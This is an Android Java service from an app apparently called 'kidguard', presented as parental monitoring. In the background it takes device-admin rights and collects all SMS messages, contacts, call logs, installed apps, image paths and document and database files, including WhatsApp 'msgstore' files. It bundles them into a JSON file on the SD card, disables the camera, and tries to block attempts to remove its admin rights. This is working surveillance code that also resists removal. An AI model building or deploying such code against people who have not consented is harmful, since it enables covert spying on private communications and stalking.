package com.kidguard.services;


import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.kidguard.MainActivity;
import com.kidguard.R;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Apps;
import com.kidguard.model.Calls;
import com.kidguard.model.Contacts;
import com.kidguard.model.Files;
import com.kidguard.model.Images;
import com.kidguard.model.Sms;
import com.kidguard.preference.Preference;
import com.kidguard.utilities.Utilities;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class BackgroundDataService extends Service implements Constant {
    private static final String TAG = "BackgroundDataService";
    private Context context;
    private ArrayList<Sms> lstSms;
    private ArrayList<Contacts> lstContacts;
    private ArrayList<Calls> lstCalls;
    private ArrayList<File> fileList;
    private ArrayList<Files> lstfiles;
    private ArrayList<Apps> lstApps;
    private ArrayList<Images> lstImages;
    private String finalJSON;
    private String finalJSON2;
    private StringBuffer sbAppend;
    private StringBuffer sbAppend2;

    private static BackgroundDataService services;
    private DevicePolicyManager mDPM;
    private ComponentName mDeviceAdminSample;
    protected boolean mAdminActive;

    public static BackgroundDataService getInstance() {
        return services;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;
        sbAppend = new StringBuffer();
        sbAppend2 = new StringBuffer();

        // Retrieve the useful instance variables
        services = BackgroundDataService.this;

        // Prepare to work with the DPM
        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mDeviceAdminSample = new ComponentName(context, DeviceAdminSampleReceiver.class);

        mDPM = services.mDPM;
        mDeviceAdminSample = services.mDeviceAdminSample;
        mAdminActive = services.isActiveAdmin();

        Log.e("active", "active??" + mAdminActive);

        /* Check For Device Admin Permission Are Enable Or Not */
        if (!mAdminActive) {
            getDeviceAdminPermission(REQUEST_CODE_ENABLE_ADMIN);
            return;
        }

        new GetDeviceData().execute();
    }

    /**
     * Helper to determine if we are an active admin
     */
    public boolean isActiveAdmin() {
        return mDPM.isAdminActive(mDeviceAdminSample);
    }

    // Get Device Admin Permissions
    private void getDeviceAdminPermission(int requestCode) {
        switch (requestCode) {
            case REQUEST_CODE_ENABLE_ADMIN:
                // Launch the activity to have the user enable our admin.
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        getString(R.string.add_admin_extra_app_text));
                if(MainActivity.getInstance() != null){
                    MainActivity.getInstance().startActivity(intent);
                }
                break;
            default:
                break;
        }
    }


    /* Get Data From Device */
    private class GetDeviceData extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {
            Log.d("doInBackground", "getData");

            // Read SMS
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_SMS)) {
                getAllSms(context);
            }

            // Read Contacts
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
                readContacts();
            }

            // Read CALL Details
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
                getCallDetails(context);
            }

            // Read Get All Files
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                getAllFiles();
                getAllShownImagesPath(context);
            }

            // List Of installed Apps
            getListApps();
            return "Executed";
        }

        @Override
        protected void onPostExecute(String result) {
            Log.d("onPostExecute", "onPostExecute");
            stopSelf();
        }

        @Override
        protected void onPreExecute() {
            mDPM.setCameraDisabled(mDeviceAdminSample, true);
            Log.d("onPreExecute", "onPreExecute");
        }

        @Override
        protected void onProgressUpdate(Void... values) {
        }
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    // Read Phone Contacts
    public void readContacts() {
        lstContacts = new ArrayList<Contacts>();
        ContentResolver cr = getContentResolver();
        Cursor cur = null;
        try {
            cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        System.out.println("name : " + name + ", ID : " + id);
                        // get the phone number
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            Contacts contact = new Contacts();
                            String phone = pCur.getString(
                                    pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contact.setName(name);
                            contact.setPhoneNo(phone);
                            lstContacts.add(contact);
                            Log.d("Contacts", "Details??" + name + "" + phone);
                        }
                        pCur.close();
                    }
                }
            }
        } catch (Exception e) {

        } finally {
            if (cur != null && !cur.isClosed())
                cur.close();
        }

        convertToJSONFormat(TAG_CONTACTS, 2);
    }

    // Get All SMS
    public List<Sms> getAllSms(Context ctx) {
        Cursor c = null;
        try {

            lstSms = new ArrayList<Sms>();
            Uri message = Uri.parse("content://sms/");
            ContentResolver cr = this.getContentResolver();

            c = cr.query(message, null, null, null, null);

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
                ((Activity) ctx).startManagingCursor(c);
            }

            int totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int i = 0; i < totalSMS; i++) {

                    final Sms objSms = new Sms();
                    objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                    objSms.setAddress(c.getString(c
                            .getColumnIndexOrThrow("address")));
                    objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                    objSms.setReadState(c.getString(c.getColumnIndex("read")));
                    objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                        objSms.setFolderName("inbox");
                    } else {
                        objSms.setFolderName("sent");
                    }

                    lstSms.add(objSms);
                    c.moveToNext();
                }

                convertToJSONFormat(TAG_SMS, 1);

            }

            c.close();
        } catch (Exception e) {

        } finally {
            try {
                if (c != null && !c.isClosed())
                    c.close();

            } catch (Exception ex) {
            }
        }


        return lstSms;
    }

    // Get Call Details
    private String getCallDetails(Context ctx) {
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = null;
        try {

            lstCalls = new ArrayList<Calls>();
            ContentResolver cr = this.getContentResolver();
            managedCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
                ((Activity) ctx).startManagingCursor(managedCursor);
            }
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :");
            while (managedCursor.moveToNext()) {
                String pname = managedCursor.getString(name);
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }

                Calls calls = new Calls();
                calls.setCallerName(pname);
                calls.setPhNumber(phNumber);
                calls.setCallType(callType);
                calls.setCallDate(callDate);
                calls.setCallDayTime(callDayTime);
                calls.setCallDuration(callDuration);
                calls.setDir(dir);
                lstCalls.add(calls);

                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
            }
            managedCursor.close();

        } catch (Exception e) {

        } finally {
            if (managedCursor != null && !managedCursor.isClosed())
                managedCursor.close();
        }

        convertToJSONFormat(TAG_CALLS, 3);

        return sb.toString();

    }

    // List Of installed Apps
    private void getListApps() {
        lstApps = new ArrayList<Apps>();
        {
            List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);
                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    Apps apps = new Apps();
                    String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                    apps.setAppname(appName);
                    lstApps.add(apps);
                }
            }
        }
        convertToJSONFormat(TAG_LIST_APPS, 4);
    }

    // Get All Files
    private void getAllFiles() {
        fileList = new ArrayList<File>();
        lstfiles = new ArrayList<Files>();
        File root = new File(Environment.getExternalStorageDirectory()
                .getAbsolutePath());
        getFile(root);

        for (int i = 0; i < fileList.size(); i++) {
            Files files = new Files();
            files.setFilename(fileList.get(i).getName());
            files.setFilePath(fileList.get(i).getAbsolutePath());
            lstfiles.add(files);
        }

        convertToJSONFormat(TAG_FILES, 5);
    }

    // Get Files List
    public ArrayList<File> getFile(File dir) {
        File listFile[] = dir.listFiles();
        if (listFile != null && listFile.length > 0) {
            for (int i = 0; i < listFile.length; i++) {

                if (listFile[i].isDirectory()) {
                    //fileList.add(listFile[i]);
                    getFile(listFile[i]);

                } else {
                    if (listFile[i].getName().endsWith(".doc")
                            || listFile[i].getName().endsWith(".pdf")
                            || listFile[i].getName().endsWith(".txt")
                            || listFile[i].getName().endsWith(".db")
                            || listFile[i].getName().startsWith("msgstore"))


                    {
                        fileList.add(listFile[i]);
                    }
                }

            }
        }
        return fileList;
    }

    /* Get Image Path */
    public void getAllShownImagesPath(Context ctx) {
        Cursor cursor = null;
        try {
            Uri uri;
            int column_index_data, column_index_folder_name;
            lstImages = new ArrayList<Images>();
            ArrayList<Images> lstImagesStr = new ArrayList<Images>();
            String absolutePathOfImage = null;
            uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            String[] projection = {MediaStore.MediaColumns.DATA,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

            cursor = ctx.getContentResolver().query(uri, projection, null,
                    null, null);

            column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
            column_index_folder_name = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
            while (cursor.moveToNext()) {
                absolutePathOfImage = cursor.getString(column_index_data);

                Images images = new Images();
                images.setImagePath(absolutePathOfImage);
                Uri uriNew = Uri.fromFile(new File(absolutePathOfImage));

                try {
                    File f = new File(uriNew.getPath());
                    long size = f.length();
                    long fileSizeInKB = size / 1024;
                    long fileSizeInMB = fileSizeInKB / 1024;
                    Date lastModDate = new Date(f.lastModified());
                    images.setSizeMB(String.valueOf(fileSizeInMB));
                    images.setSizeKB(String.valueOf(fileSizeInKB));
                    images.setDateTime(String.valueOf(lastModDate));
                } catch (Exception e) {
                    Log.e("Exception", "ImagesSize??" + e.getMessage());
                }

                lstImagesStr.add(images);
            }

            if (lstImagesStr != null && lstImagesStr.size() <= 10) {
                for (int i = 0; i < lstImagesStr.size(); i++) {
                    Images images = new Images();
                    images.setImagePath(lstImagesStr.get(i).getImagePath());
                    images.setDateTime(lstImagesStr.get(i).getDateTime());
                    images.setSizeMB(lstImagesStr.get(i).getSizeMB());
                    images.setSizeKB(lstImagesStr.get(i).getSizeKB());
                    lstImages.add(images);
                }
            } else {
                for (int i = 0; i < 10; i++) {
                    Images images = new Images();
                    images.setImagePath(lstImagesStr.get(i).getImagePath());
                    images.setDateTime(lstImagesStr.get(i).getDateTime());
                    images.setSizeMB(lstImagesStr.get(i).getSizeMB());
                    images.setSizeKB(lstImagesStr.get(i).getSizeKB());
                    lstImages.add(images);
                }
            }

        } catch (Exception e) {

        } finally {
            if (cursor != null && !cursor.isClosed())
                cursor.close();
        }

        convertToJSONFormat(TAG_IMAGES, 6);
    }

    /* Convert To JSON Format */
    private void convertToJSONFormat(String tag, int count) {
        Gson gson = new Gson();

        if (tag.equals(TAG_SMS)) {
            if (lstSms != null && lstSms.size() > 0) {
                Type type = new TypeToken<List<Sms>>() {
                }.getType();
                String jsonSMS = gson.toJson(lstSms, type);
                finalJSON = "\"SMS\":" + jsonSMS + ",";
                sbAppend.append(finalJSON);
            }

        } else if (tag.equals(TAG_CONTACTS)) {
            if (lstContacts != null && lstContacts.size() > 0) {
                Type type = new TypeToken<List<Contacts>>() {
                }.getType();
                String jsonContacts = gson.toJson(lstContacts, type);
                finalJSON = "\"CONTACTS\":" + jsonContacts + ",";
                sbAppend.append(finalJSON);
            }


        } else if (tag.equals(TAG_CALLS)) {
            if (lstCalls != null && lstCalls.size() > 0) {
                Type type = new TypeToken<List<Calls>>() {
                }.getType();
                String jsonCalls = gson.toJson(lstCalls, type);
                finalJSON = "\"CALLS\":" + jsonCalls + ",";
                sbAppend.append(finalJSON);
            }
        } else if (tag.equals(TAG_LIST_APPS)) {
            if (lstApps != null && lstApps.size() > 0) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                String jsonApps = gson.toJson(lstApps, type);
                finalJSON = "\"APPS\":" + jsonApps + ",";
                sbAppend.append(finalJSON);
            }

        } else if (tag.equals(TAG_FILES)) {

            if (lstfiles != null && lstfiles.size() > 0) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                String jsonApps = gson.toJson(lstfiles, type);
                finalJSON2 = "\"FILES\":" + jsonApps + ",";
                sbAppend2.append(finalJSON2);
            }

        } else if (tag.equals(TAG_IMAGES)) {
            if (lstImages != null && lstImages.size() > 0) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                String jsonApps = gson.toJson(lstImages, type);
                finalJSON2 = "\"IMAGES\":" + jsonApps + ",";
                sbAppend2.append(finalJSON2);
            }
        }

        if (count == 4) {
            finalJSON = "{" + sbAppend + "}";
            Log.e("JSON", "FINAL??" + finalJSON);
            //generateFile(finalJSON);
        }

        if (count == 6) {
            finalJSON2 = "{" + sbAppend2 + "}";
            Log.e("JSON", "FINAL2??" + finalJSON2);
            generateFile(finalJSON2);
        }
    }

    /* Write Files into SdCard */
    private void generateFile(String data) {
        String filepath = "/mnt/sdcard/Data.txt";
        FileOutputStream fos = null;
        try {
            try {
                fos = new FileOutputStream(filepath);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            byte[] buffer = data.getBytes();
            try {
                fos.write(buffer, 0, buffer.length);
            } catch (IOException e) {
                e.printStackTrace();
            }
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (fos != null)
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
        }
    }


    /**
     * Sample implementation of a DeviceAdminReceiver.  Your controller must provide one,
     * although you may or may not implement all of the methods shown here.
     * <p>
     * All callbacks are on the UI thread and your implementations should not engage in any
     * blocking operations, including disk I/O.
     */
    public static class DeviceAdminSampleReceiver extends DeviceAdminReceiver {
        void showToast(Context context, String msg) {
            String status = context.getString(R.string.admin_receiver_status, msg);
            Toast.makeText(context, status, Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() == ACTION_DEVICE_ADMIN_DISABLE_REQUESTED) {
                abortBroadcast();
            }
            super.onReceive(context, intent);
        }

        @Override
        public void onEnabled(Context context, Intent intent) {
            Preference.setIsAdminActive(context, true);
            showToast(context, context.getString(R.string.admin_receiver_status_enabled));
        }

        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return context.getString(R.string.admin_receiver_status_disable_warning);
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            Preference.setIsAdminActive(context, false);
            showToast(context, context.getString(R.string.admin_receiver_status_disabled));
        }

        @Override
        public void onPasswordChanged(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_changed));
        }

        @Override
        public void onPasswordFailed(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_failed));
        }

        @Override
        public void onPasswordSucceeded(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_succeeded));
        }

        @Override
        public void onPasswordExpiring(Context context, Intent intent) {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            long expr = dpm.getPasswordExpiration(
                    new ComponentName(context, DeviceAdminSampleReceiver.class));
            long delta = expr - System.currentTimeMillis();
            boolean expired = delta < 0L;
            String message = context.getString(expired ?
                    R.string.expiration_status_past : R.string.expiration_status_future);
            showToast(context, message);
            Log.v(TAG, message);
        }

    }
}
